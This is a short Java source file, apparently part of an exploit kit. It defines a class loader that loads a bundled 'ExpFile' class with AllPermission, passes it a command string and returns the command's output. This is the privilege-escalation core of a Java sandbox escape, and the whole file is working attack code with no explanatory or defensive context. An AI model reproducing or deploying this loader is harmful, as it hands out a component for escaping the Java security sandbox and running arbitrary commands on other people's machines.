package redcreen;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.security.AllPermission;
import java.security.CodeSource;
import java.security.Permissions;
import java.security.ProtectionDomain;
import java.security.cert.Certificate;

public class Help extends ClassLoader{

	public static String doWork(Help h, String cmd) throws Exception {
		InputStream is = Help.class.getResourceAsStream("/redcreen/ExpFile.class");
		ByteArrayOutputStream bos = new ByteArrayOutputStream();
		byte[] buffer = new byte[8192];
		int length;
		Class cls = null;
		while ( (length = is.read(buffer) ) > 0 ) {
			bos.write(buffer, 0, length);
		}
		
		buffer = bos.toByteArray();
		
		URL url = new URL( "file:///" );
		Certificate[] certs = new Certificate[0];
		Permissions perm = new Permissions();
		perm.add( new AllPermission() );
		ProtectionDomain pd = new ProtectionDomain( new CodeSource( url, certs ), perm );
		cls = h.defineClass( "redcreen.ExpFile", buffer, 0, buffer.length, pd );
		
		Field field1 = cls.getField("data");
		field1.set(cls, cmd);
		cls.newInstance();
		
		Field field2 = cls.getField("cmdresult");
		String ret = field2.get(cls).toString();
		return ret;
	}

}